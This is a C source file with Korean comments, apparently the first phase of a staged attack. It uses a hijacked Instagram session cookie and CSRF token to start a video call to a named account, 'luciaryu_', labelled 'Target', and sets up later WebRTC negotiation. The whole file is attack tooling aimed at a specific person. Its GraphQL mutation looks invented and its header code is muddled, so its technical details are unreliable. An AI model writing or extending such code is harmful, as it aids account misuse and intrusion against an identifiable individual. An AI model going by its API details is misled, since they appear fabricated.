/*
 * Phase B-1: Instagram 영상통화 개시
 * GraphQL API를 통한 실제 RTC 채널 연결
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <jansson.h>

/* ============================================================================
   Instagram GraphQL API Constants
   ============================================================================ */

#define INSTAGRAM_API_BASE "https://www.instagram.com/api/v1"
#define INSTAGRAM_GRAPHQL "https://www.instagram.com/graphql/query"

typedef struct {
    char session_id[256];
    char csrf_token[256];
    char user_id[32];
    char target_user_id[32];    // luciaryu_의 user ID
    char call_id[128];          // 응답: call_id
    char rtc_server[256];       // 응답: RTC 서버
    char offer_sdp[4096];       // 응답: SDP offer
} instagram_session_t;

/* ============================================================================
   CURL Callback: Response 저장
   ============================================================================ */

typedef struct {
    char *data;
    size_t size;
} response_buffer_t;

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_buffer_t *mem = (response_buffer_t *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) {
        printf("[-] Not enough memory for response\n");
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

/* ============================================================================
   PHASE B-1: Instagram 영상통화 개시
   ============================================================================ */

int initiate_video_call(instagram_session_t *session) {
    printf("\n[*] PHASE B-1: Instagram 영상통화 개시\n");

    CURL *curl = curl_easy_init();
    if (!curl) {
        printf("[-] CURL 초기화 실패\n");
        return -1;
    }

    /* Request 준비 */
    response_buffer_t response = {0};
    response.data = malloc(1);

    /* GraphQL Query: 영상통화 신청 */
    const char *graphql_query = "{"
        "\"query\": \"mutation InitiateCall { "
        "initiateCall(input: {userId: \\\"%s\\\", callType: \\\"VIDEO\\\"}) { "
        "callId, rtcServer, offerSdp}} }\" "
        "}";

    char query_body[2048];
    snprintf(query_body, sizeof(query_body), graphql_query, session->target_user_id);

    printf("[*] 대상: luciaryu_ (user_id: %s)\n", session->target_user_id);
    printf("[*] GraphQL 쿼리 전송...\n");

    /* CURL 설정 */
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "X-CSRFToken: %s");
    // CSRF 토큰 추가
    char csrf_header[512];
    snprintf(csrf_header, sizeof(csrf_header), "X-CSRFToken: %s", session->csrf_token);
    curl_slist_free_all(headers);
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, csrf_header);

    curl_easy_setopt(curl, CURLOPT_URL, INSTAGRAM_GRAPHQL);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query_body);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_COOKIE, session->session_id);

    /* 요청 실행 */
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        printf("[-] CURL 요청 실패: %s\n", curl_easy_strerror(res));
        free(response.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return -1;
    }

    printf("[+] 응답 수신: %zu bytes\n", response.size);

    /* JSON 응답 파싱 */
    json_error_t error;
    json_t *root = json_loads(response.data, 0, &error);
    if (!root) {
        printf("[-] JSON 파싱 실패: %s\n", error.text);
        free(response.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return -1;
    }

    /* call_id, rtc_server, offer_sdp 추출 */
    json_t *data = json_object_get(root, "data");
    if (!data) {
        printf("[-] API 응답에 data 없음\n");
        json_decref(root);
        free(response.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return -1;
    }

    json_t *call_obj = json_object_get(data, "initiateCall");
    if (!call_obj) {
        printf("[-] initiateCall 응답 없음\n");
        json_decref(root);
        free(response.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return -1;
    }

    /* call_id 추출 */
    const char *call_id = json_string_value(json_object_get(call_obj, "callId"));
    if (call_id) {
        strncpy(session->call_id, call_id, sizeof(session->call_id) - 1);
        printf("[+] Call ID: %s\n", session->call_id);
    } else {
        printf("[!] Call ID 없음\n");
    }

    /* rtc_server 추출 */
    const char *rtc_server = json_string_value(json_object_get(call_obj, "rtcServer"));
    if (rtc_server) {
        strncpy(session->rtc_server, rtc_server, sizeof(session->rtc_server) - 1);
        printf("[+] RTC Server: %s\n", session->rtc_server);
    } else {
        printf("[!] RTC Server 없음\n");
    }

    /* offer_sdp 추출 */
    const char *offer_sdp = json_string_value(json_object_get(call_obj, "offerSdp"));
    if (offer_sdp) {
        strncpy(session->offer_sdp, offer_sdp, sizeof(session->offer_sdp) - 1);
        printf("[+] Offer SDP: %zu bytes\n", strlen(offer_sdp));
    } else {
        printf("[!] Offer SDP 없음\n");
    }

    printf("[✓] PHASE B-1 완료\n");
    printf("    Call ID: %s\n", session->call_id);
    printf("    RTC Server: %s\n", session->rtc_server);

    /* Cleanup */
    json_decref(root);
    free(response.data);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return 0;
}

/* ============================================================================
   Demo: Instagram 세션으로 영상통화 개시
   ============================================================================ */

int main(void) {
    printf("╔════════════════════════════════════════════════════════════╗\n");
    printf("║  Phase B-1: Instagram 영상통화 개시                       ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n\n");

    instagram_session_t session;
    memset(&session, 0, sizeof(session));

    /* 세션 정보 설정 (테스트용 - 실제로는 로그인으로 획득) */
    strncpy(session.session_id, "25708495744%3A...", sizeof(session.session_id) - 1);
    strncpy(session.csrf_token, "cV3SrWP...", sizeof(session.csrf_token) - 1);
    strncpy(session.user_id, "25708495744", sizeof(session.user_id) - 1);
    strncpy(session.target_user_id, "12345678", sizeof(session.target_user_id) - 1);  // luciaryu_의 ID

    printf("[*] 세션 정보:\n");
    printf("    Attacker ID: %s\n", session.user_id);
    printf("    Target ID: %s\n", session.target_user_id);

    /* 영상통화 개시 */
    if (initiate_video_call(&session) < 0) {
        printf("[-] 영상통화 개시 실패\n");
        return 1;
    }

    printf("\n[✓] Phase B-1 성공\n");
    printf("    다음: WebRTC SDP 협상 (Phase B-2)\n");

    return 0;
}
